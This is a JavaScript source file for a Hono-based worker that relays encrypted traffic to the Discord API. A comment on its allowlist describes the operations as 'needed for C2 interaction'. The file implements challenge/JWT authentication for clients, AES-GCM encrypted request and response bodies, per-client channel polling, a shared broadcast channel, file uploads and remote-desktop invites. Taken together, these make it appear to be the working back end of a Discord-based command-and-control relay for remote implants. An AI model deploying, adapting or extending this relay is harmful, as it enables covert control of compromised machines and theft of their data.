import { Hono } from 'hono';
import { SignJWT, jwtVerify } from 'jose';

const app = new Hono();
const DISCORD_API_BASE = "https://discord.com";

// --- Global Cache (Persists for hot instances) ---
const GLOBAL_CACHE = {
  channels: new Map(),
  lastProcessed: new Map(), // Could also cache last processed ID for short bursts
  nonces: new Map(),        // Anti-Replay: Track used nonces
  challenges: new Map(),    // Memory cache for challenges
  rateLimits: new Map()     // Basic rate limiting map
};

let lastCleanup = Date.now();
function performCleanup() {
  const now = Date.now();
  if (now - lastCleanup < 60000) return;
  lastCleanup = now;

  for (const [key, { expiresAt }] of GLOBAL_CACHE.nonces.entries()) {
    if (now > expiresAt) GLOBAL_CACHE.nonces.delete(key);
  }
  for (const [key, { expiresAt }] of GLOBAL_CACHE.challenges.entries()) {
    if (now > expiresAt) GLOBAL_CACHE.challenges.delete(key);
  }
  for (const [key, { expiresAt }] of GLOBAL_CACHE.rateLimits.entries()) {
    if (now > expiresAt) GLOBAL_CACHE.rateLimits.delete(key);
  }
}

// --- Rate Limiting Helper ---
function isRateLimited(ip, endpoint, maxReqs, windowMs) {
  const key = `${ip}:${endpoint}`;
  const now = Date.now();
  if (!GLOBAL_CACHE.rateLimits.has(key)) {
    GLOBAL_CACHE.rateLimits.set(key, { count: 1, expiresAt: now + windowMs });
    return false;
  }
  const record = GLOBAL_CACHE.rateLimits.get(key);
  if (now > record.expiresAt) {
    GLOBAL_CACHE.rateLimits.set(key, { count: 1, expiresAt: now + windowMs });
    return false;
  }
  record.count += 1;
  return record.count > maxReqs;
}

// --- Helper: Decode Base64 safely ---
function b64DecodeUnicode(str) {
  try {
    let s = str.replace(/-/g, '+').replace(/_/g, '/');
    while (s.length % 4) s += '=';
    return atob(s);
  } catch (e) { return null; }
}

// --- Utilities (Encryption/Decryption) ---
async function encryptData(data, keyString) {
  const keyBytes = Uint8Array.from(atob(keyString), c => c.charCodeAt(0));
  const dataBytes = typeof data === 'string' ? new TextEncoder().encode(data) : new TextEncoder().encode(JSON.stringify(data));
  const nonceBytes = crypto.getRandomValues(new Uint8Array(12));
  const key = await crypto.subtle.importKey("raw", keyBytes, { name: "AES-GCM" }, false, ["encrypt"]);
  const encrypted = await crypto.subtle.encrypt({ name: "AES-GCM", iv: nonceBytes }, key, dataBytes);
  return { encrypted: btoa(String.fromCharCode(...new Uint8Array(encrypted))), nonce: btoa(String.fromCharCode(...nonceBytes)) };
}

async function decryptPayload(encryptedPayload, nonce, keyString) {
  try {
    const keyBytes = Uint8Array.from(atob(keyString), c => c.charCodeAt(0));
    const encryptedBytes = Uint8Array.from(atob(encryptedPayload), c => c.charCodeAt(0));
    const nonceBytes = Uint8Array.from(atob(nonce), c => c.charCodeAt(0));

    // Anti-replay check
    if (GLOBAL_CACHE.nonces.has(nonce)) {
      throw new Error('Replay attack detected: duplicate nonce');
    }
    // Track nonce for 5 minutes
    GLOBAL_CACHE.nonces.set(nonce, { expiresAt: Date.now() + 300000 });

    const key = await crypto.subtle.importKey("raw", keyBytes, { name: "AES-GCM" }, false, ["decrypt"]);
    const decrypted = await crypto.subtle.decrypt({ name: "AES-GCM", iv: nonceBytes }, key, encryptedBytes);
    return decrypted;
  } catch (e) {
    throw e;
  }
}

async function verifyHMAC(message, signature, secret) {
  const key = await crypto.subtle.importKey("raw", new TextEncoder().encode(secret), { name: "HMAC", hash: "SHA-256" }, false, ["verify"]);
  return await crypto.subtle.verify("HMAC", key, Uint8Array.from(atob(signature), c => c.charCodeAt(0)), new TextEncoder().encode(message));
}

// --- Discord API Fetcher ---
async function fetchFromDiscord(method, path, body = null, botToken = null) {
  if (!botToken) throw new Error("Bot token is unconfigured");
  const url = `${DISCORD_API_BASE}${path}`;
  const headers = { "Authorization": `Bot ${botToken}`, "User-Agent": "Snaky-Proxy/1.0" };
  const options = { method, headers };

  if (body && body.file_data_b64) {
    const formData = new FormData();
    const payloadJson = { content: body.content, embeds: body.embeds };
    formData.append("payload_json", JSON.stringify(payloadJson));
    const binary = atob(body.file_data_b64);
    const bytes = new Uint8Array(binary.length);
    for (let i = 0; i < binary.length; i++) bytes[i] = binary.charCodeAt(i);
    formData.append("file", new Blob([bytes], { type: "image/png" }), body.filename || "file.png");
    options.body = formData;
  } else if (body && Object.keys(body).length > 0 && method !== 'GET') {
    headers["Content-Type"] = "application/json";
    options.body = JSON.stringify(body);
  }

  try {
    const response = await fetch(url, options);
    const data = response.status === 204 ? {} : (response.headers.get("content-type")?.includes("json") ? await response.json() : { text: await response.text() });
    return { status: response.status, data };
  } catch (e) { return { status: 502, data: { error: e.message } }; }
}

// --- Endpoints ---
app.post('/auth/challenge', async (c) => {
  const clientIp = c.req.header('cf-connecting-ip') || 'unknown';

  // Rate Limit: Max 10 challenge requests per minute per IP
  if (isRateLimited(clientIp, 'challenge', 10, 60000)) {
    return c.json({ error: "Too many requests" }, 429);
  }

  const { client_id } = await c.req.json();
  if (!client_id || typeof client_id !== 'string') return c.json({ error: "Invalid client_id" }, 400);

  const challenge = btoa(String.fromCharCode(...crypto.getRandomValues(new Uint8Array(32))));

  // Save to Memory Cache first (fast path)
  GLOBAL_CACHE.challenges.set(client_id, { challenge, expiresAt: Date.now() + 300000 });

  // Also save to KV (fallback for cross-instance workers), with async non-blocking catch
  c.executionCtx.waitUntil(
    c.env.ENCRYPTION_KV.put(`challenge:${client_id}`, challenge, { expirationTtl: 300 })
      .catch(() => { }) // Ignore KV errors
  );

  return c.json({ challenge });
});

app.post('/auth/verify', async (c) => {
  const { client_id, signature } = await c.req.json();

  // Try memory cache first
  let challenge = null;
  const memChallenge = GLOBAL_CACHE.challenges.get(client_id);
  if (memChallenge && Date.now() < memChallenge.expiresAt) {
    challenge = memChallenge.challenge;
  } else {
    // Fallback to KV
    challenge = await c.env.ENCRYPTION_KV.get(`challenge:${client_id}`);
  }

  const secret = c.env.SHARED_SECRET;
  if (!secret) return c.json({ error: "Server missing secret config" }, 401);

  if (!challenge || !(await verifyHMAC(challenge, signature, secret))) {
    return c.json({ error: "Fail" }, 401);
  }

  const jwtSecret = c.env.JWT_SECRET;
  const masterKey = c.env.MASTER_KEY_B64;
  const sessionDuration = parseInt(c.env.SESSION_DURATION) || 86400;

  const sessionToken = await new SignJWT({ client_id })
    .setProtectedHeader({ alg: 'HS256' })
    .setIssuedAt()
    .setExpirationTime(`${sessionDuration}s`)
    .sign(new TextEncoder().encode(jwtSecret));

  return c.json({ session_token: sessionToken, expires_in: sessionDuration, encryption_key: masterKey });
});

app.use('*', async (c, next) => {
  performCleanup(); // Lazy cleanup

  if (c.req.path.startsWith('/auth/')) return await next();
  try {
    const auth = c.req.header('Authorization');
    if (!auth) throw new Error('No auth header');

    // Dynamic config parsing
    const jwtSecret = c.env.JWT_SECRET;
    const masterKey = c.env.MASTER_KEY_B64;

    const { payload } = await jwtVerify(auth.substring(7), new TextEncoder().encode(jwtSecret));
    c.set('client_id', payload.client_id);

    // Client always sends encrypted payload
    if (c.req.method === 'POST' && c.req.header('content-type')?.includes('application/json')) {
      const body = await c.req.json();
      if (body.encrypted_payload && body.nonce) {
        const decrypted = await decryptPayload(body.encrypted_payload, body.nonce, masterKey);
        const decryptedBody = JSON.parse(new TextDecoder().decode(decrypted));
        c.set('decryptedBody', decryptedBody);
      }
    }
  } catch (e) {
    return c.json({ error: "Auth" }, 401);
  }

  await next();
  if (c.req.path.startsWith('/auth/')) return;

  const originalRes = await c.res.text();
  const masterKey = c.env.MASTER_KEY_B64;
  const { encrypted, nonce } = await encryptData(originalRes, masterKey);
  c.res = c.json({ encrypted_response: encrypted, nonce }, c.res.status);
});


// --- Dynamic Global Channel Lookup ---
async function resolveGlobalChannel(c, guildId) {
  if (!guildId) return null;
  const kvKey = `global_channel:${guildId}`;

  // 0. Check Memory Cache first
  if (GLOBAL_CACHE.channels.has(guildId)) {
    return GLOBAL_CACHE.channels.get(guildId);
  }

  // 1. Check KV Cache
  let cachedId = await c.env.ENCRYPTION_KV.get(kvKey);
  if (cachedId) {
    cachedId = cachedId.replace(/^"|"$/g, '');
    GLOBAL_CACHE.channels.set(guildId, cachedId);
    return cachedId;
  }

  // 2. Fetch Channels from Discord
  const res = await fetchFromDiscord("GET", `/api/v10/guilds/${guildId}/channels`, null, c.env.BOT_TOKEN);
  if (res.status !== 200) return null;

  const channels = res.data;
  if (!Array.isArray(channels)) return null;

  // 3. Find target channel ('main' or 'general' or 'chat') - Text Channel is type 0
  const target = channels.find(ch =>
    ch.type === 0 && (ch.name === 'main' || ch.name === 'general' || ch.name === 'chat')
  );

  if (target) {
    // Non-blocking KV write
    c.executionCtx.waitUntil(c.env.ENCRYPTION_KV.put(kvKey, target.id).catch(() => { }));
    GLOBAL_CACHE.channels.set(guildId, target.id);
    return target.id;
  }

  return null;
}

app.post('/poll', async (c) => {
  const dBody = c.get('decryptedBody');
  const channelId = dBody.channel_id;
  const guildId = dBody.guild_id;
  const clientId = c.get('client_id');
  const botToken = c.env.BOT_TOKEN;

  // Validate dynamic global channel
  const globalChannelId = await resolveGlobalChannel(c, guildId);

  if (!channelId || channelId === "1") return c.json([]);

  const lastIdKey = `last_msg:${clientId}`;

  // Check Memory Cache for last ID
  let lastProcessedId = GLOBAL_CACHE.lastProcessed.get(clientId);
  if (!lastProcessedId) {
    lastProcessedId = await c.env.ENCRYPTION_KV.get(lastIdKey);
    if (lastProcessedId) GLOBAL_CACHE.lastProcessed.set(clientId, lastProcessedId);
  }

  if (!lastProcessedId) {
    const requests = [fetchFromDiscord("GET", `/api/v10/channels/${channelId}/messages?limit=50`, null, botToken)];
    if (globalChannelId) {
      requests.push(fetchFromDiscord("GET", `/api/v10/channels/${globalChannelId}/messages?limit=50`, null, botToken));
    }

    const results = await Promise.all(requests);
    const privateRecent = results[0];
    const globalRecent = results.length > 1 ? results[1] : { data: [] };

    const botId = b64DecodeUnicode(botToken ? botToken.split('.')[0] : "");
    const allMessages = [
      ...(Array.isArray(globalRecent.data) ? globalRecent.data : []),
      ...(Array.isArray(privateRecent.data) ? privateRecent.data : [])
    ].sort((a, b) => a.id.localeCompare(b.id));

    if (allMessages.length > 0) {
      const newestId = allMessages[allMessages.length - 1].id;
      c.executionCtx.waitUntil(c.env.ENCRYPTION_KV.put(lastIdKey, newestId).catch(() => { }));
      GLOBAL_CACHE.lastProcessed.set(clientId, newestId);
      return c.json([]);
    } else {
      c.executionCtx.waitUntil(c.env.ENCRYPTION_KV.put(lastIdKey, '1').catch(() => { }));
      GLOBAL_CACHE.lastProcessed.set(clientId, '1');
      return c.json([]);
    }
  }

  // Regular Polling
  const requests = [
    fetchFromDiscord("GET", `/api/v10/channels/${channelId}/messages?after=${lastProcessedId}&limit=10`, null, botToken)
  ];
  if (globalChannelId) {
    requests.push(fetchFromDiscord("GET", `/api/v10/channels/${globalChannelId}/messages?after=${lastProcessedId}&limit=10`, null, botToken));
  }

  const results = await Promise.all(requests);
  const privateRes = results[0];
  const globalRes = results.length > 1 ? results[1] : { data: [] };

  const globalMessages = Array.isArray(globalRes.data) ? globalRes.data : [];
  const privateMessages = Array.isArray(privateRes.data) ? privateRes.data : [];

  const botId = b64DecodeUnicode(botToken ? botToken.split('.')[0] : "");
  const messages = [...globalMessages, ...privateMessages]
    .sort((a, b) => a.id.localeCompare(b.id));

  if (messages.length > 0) {
    const newestId = messages[messages.length - 1].id;
    c.executionCtx.waitUntil(c.env.ENCRYPTION_KV.put(lastIdKey, newestId).catch(() => { }));
    GLOBAL_CACHE.lastProcessed.set(clientId, newestId);
  }

  const filtered = messages.filter(m => m.author && m.author.id !== botId);
  return c.json(filtered);
});

// SSRF AND OPEN PROXY PREVENTION:
// Ensure only validated Discord API endpoints can be targeted by this proxy
app.post('/api/v10/*', async (c) => {
  const body = await c.req.json();
  const targetMethod = (body.target_method || 'GET').toUpperCase();
  const decryptedBody = c.get('decryptedBody');
  const botToken = c.env.BOT_TOKEN;

  // Hardened Request Path verification
  // Allows valid operations needed for C2 interaction and restricts everything else
  const allowedPaths = [
    /^\/api\/v10\/channels\/\d+\/messages$/,          // Send Message / Poll Messages
    /^\/api\/v10\/channels\/\d+\/messages\/\d+$/,      // Edit/Delete Message
    /^\/api\/v10\/channels\/\d+\/invites$/,            // Remote Desktop / Activity Invites
    /^\/api\/v10\/guilds\/\d+\/channels$/,             // Get/Create Guild Channels
    /^\/api\/v10\/users\/@me$/                         // Get Me
  ];

  const targetPath = c.req.path;
  const isAllowedPath = allowedPaths.some(pattern => pattern.test(targetPath));

  if (!isAllowedPath) {
    return c.json({ error: "Access Denied: Path not explicitly whitelisted." }, 403);
  }

  // If doing a DELETE operation, prevent deleting channels themselves
  if (targetMethod === 'DELETE' && targetPath.match(/^\/api\/v10\/channels\/\d+$/)) {
    return c.json({ error: "Access Denied: Cannot delete Discord Channels." }, 403);
  }

  const result = await fetchFromDiscord(targetMethod, targetPath, decryptedBody, botToken);
  return c.json(result.data, result.status);
});

export default app;
